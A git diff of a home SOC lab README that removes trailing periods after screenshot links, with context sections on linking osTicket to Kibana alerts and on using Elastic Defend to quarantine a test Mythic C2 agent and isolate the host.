@@ -1441,7 +1441,7 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
    
    - Staff Control Panel URL: `http://<your_public_IP>/osticket/upload/scp`
 
-![urls](Screenshots/osticketconfig9.png).
+![urls](Screenshots/osticketconfig9.png)
 
 8. Access the admin portal using the staff control panel URL to configure osTicket as needed (e.g., adding agents, setting SLAs).
 
@@ -1455,12 +1455,12 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
 
 4. Copy this API key for later use.
 
-![API](Screenshots/osticketticket3.png).
+![API](Screenshots/osticketticket3.png)
 
 5. In Kibana, go to Stack Management > Connectors > + Create connector.
 > When trying to add an API connector to Elastic, we need to upgrade the license. Let's do that and choose the free 30-day trial.
 
-![upgrade](Screenshots/osticketticket4.png).
+![upgrade](Screenshots/osticketticket4.png)
 
 6. Choose Webhook as the connector type:
    - Set method as POST.
@@ -1469,18 +1469,18 @@ Now let's create a ticketing system for our alerts using **open-source osTicket*
 
 7. Save & test this connector.
 
-![Editconnector](Screenshots/osticketticket5.png).
+![Editconnector](Screenshots/osticketticket5.png)
 
 8. Test Webhook Payload:
    Use an example from [osTicket's GitHub](https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md) page for testing purposes by copying the XML payload example into Kibana's body section and running it.
 
-![githubexample](Screenshots/osticketticket6.png).
+![githubexample](Screenshots/osticketticket6.png)
 
-![test](Screenshots/osticketticket7.png).
+![test](Screenshots/osticketticket7.png)
 
 9. Check osTicket's Agent panel; you should see a new ticket generated from your API test.
 
-![elasticticket](Screenshots/osticketticket8.png).
+![elasticticket](Screenshots/osticketticket8.png)
 
 Now you have successfully integrated osTicket with ELK! Any alerts generated in ELK will automatically create tickets in your osTicket ticketing system.
 
@@ -1506,7 +1506,7 @@ Now you have successfully integrated osTicket with ELK! Any alerts generated in 
      - Update `<subject>` to include the rule name by clicking on the plus icon and selecting the rule name.
      - Adjust the message to: "Possible <name of the rule>, please investigate."
 
-![elasticticketmodify](Screenshots/osticketticket9.png).
+![elasticticketmodify](Screenshots/osticketticket9.png)
 
 5. **Save Changes**:
    - Click on `Save changes`.
@@ -1521,12 +1521,12 @@ Now you have successfully integrated osTicket with ELK! Any alerts generated in 
 7. **Check osTicket**:
    - Go to the osTicket web portal to verify if a ticket for SSH Brute Force was created.
 
-![osticketelastic](Screenshots/osticketticket999.png).
+![osticketelastic](Screenshots/osticketticket999.png)
 
 8. **Add Rule Link in Ticket**:
    - Modify your alert rule to include a link back to Kibana for easier access by SOC analysts.
 
-![link](Screenshots/linkurl.png).
+![link](Screenshots/linkurl.png)
 
    - SSH into your ELK server and set your public IP address in the config file:
      ```bash
@@ -1534,7 +1534,7 @@ Now you have successfully integrated osTicket with ELK! Any alerts generated in 
      ```
    - Add public IP address to `server.publicBaseUrl: "http://<public-IP-address-ELK-server>:5601"`.
 
-![uncoment](Screenshots/rulesaction2.png).
+![uncoment](Screenshots/rulesaction2.png)
 
 10. **Restart Kibana**:
    ```bash
@@ -1545,7 +1545,7 @@ Now you have successfully integrated osTicket with ELK! Any alerts generated in 
    systemctl status kibana.service
    ```
 
-![linkinticket](Screenshots/rulesaction3.png).
+![linkinticket](Screenshots/rulesaction3.png)
 
 ## Modifying RDP Brute Force Attempt and Mythic C2 Apollo Agent Rules
 
@@ -1558,7 +1558,7 @@ Now you have successfully integrated osTicket with ELK! Any alerts generated in 
 3. **Verify Ticket Creation**:
    - Ensure that both alert rules are now creating tickets in your ticketing system.
 
-![ruledetection](Screenshots/rulesaction5.png).
+![ruledetection](Screenshots/rulesaction5.png)
 
 
 ## Installing Elastic Defend
@@ -1572,49 +1572,49 @@ Now that we have started the 30-day free trial in Elastic, let's install the EDR
    - Select the **Traditional Endpoints** type and choose the **Complete EDR** option.
    - Click on **Existing hosts**, select the **Windows Target Server**, and then click on **Save and continue**.
 
-![elasticdefent](Screenshots/elasticdefender.png).
+![elasticdefent](Screenshots/elasticdefender.png)
 
 4. **Manage Endpoints**: Navigate back to the **Security** tab, click on **Manage**, then click on **Endpoints**. Here, you will see an option under actions labeled **Isolate host**, which is not included in the free version.
 
-![isolatehost](Screenshots/elasticdefender2.png).
+![isolatehost](Screenshots/elasticdefender2.png)
 
 5. **Testing with Mythic C2 Apollo Agent**:
    - RDP back into our Target Windows Server and try to run the Mythic C2 Apollo agent again.
    - You will notice that Elastic Defend prevents us from running the Apollo agent and quarantines it, making it invisible even in the Temp folder.
 
-![detected](Screenshots/elasticdefender3.png).
+![detected](Screenshots/elasticdefender3.png)
 
-![quarantine](Screenshots/elasticdefender4.png).
+![quarantine](Screenshots/elasticdefender4.png)
 
 6. **Review Alerts**: Go to the **Alerts** section where you will find a new rule that was not manually created. 
 
-![newrule](Screenshots/elasticdefender5.png).
+![newrule](Screenshots/elasticdefender5.png)
 
 7. **Create a Action for new Rule**:
    - Click on one of the new rules titled **Malware Prevention Alert**.
    - In the flyout, click on **Endpoint Security**, then click on **Edit rule settings**.
    - Go to the Actions tab in the Response Actions, select Elastic Defend, choose an action from the list (let's select `Isolate`), and click on **Save changes**.
 
-![action](Screenshots/elasticdefender6.png).
+![action](Screenshots/elasticdefender6.png)
 
-![defendaction](Screenshots/elasticdefender7.png).
+![defendaction](Screenshots/elasticdefender7.png)
 
-![actiondefend](Screenshots/elasticdefender8.png).
+![actiondefend](Screenshots/elasticdefender8.png)
 
 8. **Run Mythic Apollo Agent Again**:
    - Since it is no longer on our Target Windows Server, download it again.
    - As soon as you do, Elastic Defend quarantines the Apollo agent before it can be executed.
    - You will see an Elastic Defend message indicating that the host is isolated and that it cannot ping Cloudflare or Google DNS.
 
-![dnsping](Screenshots/elasticdefender9.png).
+![dnsping](Screenshots/elasticdefender9.png)
 
-![hostisolated](Screenshots/elasticdefender99.png).
+![hostisolated](Screenshots/elasticdefender99.png)
 
 9. **Release Host for Testing Again**:
    - To test this again, return to Kibana, go to the Security tab, then Manage, and click on Endpoints.
    - Locate your Target Windows Server; from the right side of your screen, click on the three dots under Action and select `Release host`.
 
-![releasehost](Screenshots/elasticdefender999.png).
+![releasehost](Screenshots/elasticdefender999.png)
 
 
 ## Conclusion  
